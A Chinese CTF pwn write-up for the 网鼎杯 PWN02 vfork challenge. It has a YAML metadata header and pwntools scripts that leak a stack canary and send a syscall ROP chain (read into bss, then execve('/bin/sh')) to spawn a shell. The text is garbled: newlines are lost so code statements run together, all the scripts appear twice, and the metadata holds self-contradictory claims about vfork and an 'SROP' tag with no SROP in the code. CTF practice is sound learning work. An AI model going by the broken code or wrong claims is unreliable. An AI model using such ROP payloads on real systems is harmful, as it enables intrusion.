---
title: web选手入门pwn(22) 网鼎杯PWN02 vfork
contest: 网鼎杯
year: 2024
difficulty: medium
vuln_type: rop
tags:
- vfork
- canary-leak
- syscall
- SROP-chain
- ROP-pop-rax
attack_chain: 'leave your name填p64(1)*8让后续puts打印栈上数据→泄canary/Wanna return填B跳过return/once again填C*256把栈扩到 canary 区域/fourth sendline after once again再次256字节爆破触发可写/final ROP: read(0,bss,0x100)→execve(/bin/sh,0,0)'
key_payload: pop_rax=0x450277  pop_rdi=0x40213f  pop_rsi=0x40a1ae  pop_rdx_rbx=0x485feb  syscall=0x41ac26  bss=0x4CB800
one_liner: 网鼎杯 PWN02，vfork 子进程断点跟随 + 多次 sendlineafter 泄 canary + 自写 read/execve syscall ROP 链。
lesson: vfork 子进程独立地址空间但共用父进程页表；gdb follow-fork-mode child + detach-on-fork off 同时跟踪父子；pop rax+syscall 不需要 magic gadget，可直接构造 read(0,bss,N)→execve(/bin/sh,0,0) 两段 ROP。
quality: high
full_path: web选手入门pwn(22)_——网鼎杯PWN02(vfork).full.md
meta_path: web选手入门pwn(22)_——网鼎杯PWN02(vfork).meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: web选手入门pwn(22) 网鼎杯PWN02 vfork。网鼎杯 PWN02，vfork 子进程断点跟随 + 多次 sendlineafter 泄 canary + 自写 read/execve syscall ROP 链。。经验：vfork 子进程独立地址空间但共用父进程页表；gdb follow-fork-mode child + detach-...
category: pwn
subcategory: rop
tools_used:
- ROP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/214123.html
reasoning_chain:
- 程序用 vfork 分父子进程，set follow-fork-mode child + detach-on-fork off 让 gdb 同时跟踪 → 触发点：必须跟随子进程断点
- 假设：vfork 子进程独立地址空间但共用父进程页表 → 动作：gdb b *0x401A30 / b *0x401995 / b *0x4018D4
- leave your name 填 p64(1)*8 → 后续 puts 打印栈上数据 → 假设：可泄 canary
- Wanna return 填 B 跳过 return → once again 填 C*256 把栈扩到 canary 区域 → 假设：堆栈推 256 字节逐步覆盖
- 假设：第 N 次 256 字节覆盖命中 canary → 观察：sh.sendlineafter('once again?','D'*256) 触发可写
- 动作：构造 ROP read(0, bss, 0x100) → execve(/bin/sh, 0, 0) → 动作：pop rax=0x450277 + pop rdi=0x40213f + pop rsi=0x40a1ae + pop rdx_rbx=0x485feb + syscall=0x41ac26
- 观察：拿到 shell → 完成
failed_attempts:
- 试图直接 leave 跳过 → 失败：必须 sendafter 才能在 vfork 子进程位置停下
- 试图单 sendlineafter 触发 ROP → 失败：需要多次 256 字节才能扩栈到 canary
- 试图用 pop_rdi_only gadget → 失败：缺 pop_rax 与 syscall gadget
key_observations:
- vfork 子进程独立地址空间但共用父进程页表
- gdb follow-fork-mode child + detach-on-fork off 同时跟踪父子
- pop rax + syscall 不需要 magic gadget，可直接构造 read(0,bss,N)→execve(/bin/sh,0,0) 两段 ROP
- 逐步扩栈 + canary 漏点是 vfork 场景下的经典套路
prerequisites:
- GDB 多进程调试（follow-fork-mode / detach-on-fork）
- ROP gadget 搜索（pop rax / pop rdi / pop rsi / pop rdx_rbx / syscall）
- Pwntools ROPgadget / ROP 模块
- vfork 与 fork 的区别
---
# web选手入门pwn(22) ——网鼎杯PWN02(vfork)

> 原文: https://www.ctfiot.com/214123.html
> ID: 214123

set follow-fork-mode childset detach-on-fork off

gdb ./pwnset follow-fork-mode childset detach-on-fork offb *0x401A30b *0x401995r

info inferiorsinferior 1

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n c")#sh = process("./pwn")
sh.sendafter("leave your name","A"*64)sh.sendafter("Wanna return?","B")
sh.interactive()

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)sh.sendafter("once again?","D"*256)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8 + "E"*8sh.sendafter("once again?",payload)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()

ROPgadget --binary ./pwn --only "pop|ret" | grep raxROPgadget --binary ./pwn --opcode 0F05C3

#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
#sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)
pop_rax = 0x0000000000450277pop_rdi = 0x000000000040213fpop_rsi = 0x000000000040a1aepop_rdx_rbx = 0x0000000000485febsyscall = 0x000000000041ac26ret = 0x41ac28bss = 0x4CB800
payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8#read(0,bss,0x100)payload+= p64(pop_rax) + p64(0x0) + p64(pop_rdi) + p64(0x0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_rbx) + p64(0x100) + p64(0x100) + p64(syscall)payload+= p64(ret)#execve('/bin/sh',0,0)payload+= p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx_rbx) + p64(0x0) + p64(0x0) + p64(syscall)sh.sendafter("once again?",payload)sh.send("/bin/sh")
sh.interactive()


```
set follow-fork-mode childset detach-on-fork off
gdb ./pwnset follow-fork-mode childset detach-on-fork offb *0x401A30b *0x401995r
info inferiorsinferior 1
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n c")#sh = process("./pwn")
sh.sendafter("leave your name","A"*64)sh.sendafter("Wanna return?","B")
sh.interactive()
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)sh.sendafter("once again?","D"*256)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")#sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8 + "E"*8sh.sendafter("once again?",payload)sh.sendafter("once again?","E"*256)sh.sendafter("once again?","F"*256)
sh.interactive()
ROPgadget --binary ./pwn --only "pop|ret" | grep raxROPgadget --binary ./pwn --opcode 0F05C3
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
    #sh = gdb.debug("./pwn","set follow-fork-mode childn set detach-on-fork off n b *0x401A30 n b *0x401995 n b *0x4018D4 n c")sh = process("./pwn")
canary = int(sh.recvuntil("n")[8:24],16)print(hex(canary))
sh.sendafter("leave your name",p64(1)*8)sh.sendafter("Wanna return?","B")sh.sendafter("once again?","C"*256)
pop_rax = 0x0000000000450277pop_rdi = 0x000000000040213fpop_rsi = 0x000000000040a1aepop_rdx_rbx = 0x0000000000485febsyscall = 0x000000000041ac26ret = 0x41ac28bss = 0x4CB800
payload = p32(0x11111111) * 64 + p64(canary) + p64(canary) + "D"*8#read(0,bss,0x100)payload+= p64(pop_rax) + p64(0x0) + p64(pop_rdi) + p64(0x0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx_rbx) + p64(0x100) + p64(0x100) + p64(syscall)payload+= p64(ret)#execve('/bin/sh',0,0)payload+= p64(pop_rax) + p64(0x3b) + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0x0) + p64(pop_rdx_rbx) + p64(0x0) + p64(0x0) + p64(syscall)sh.sendafter("once again?",payload)sh.send("/bin/sh")
sh.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]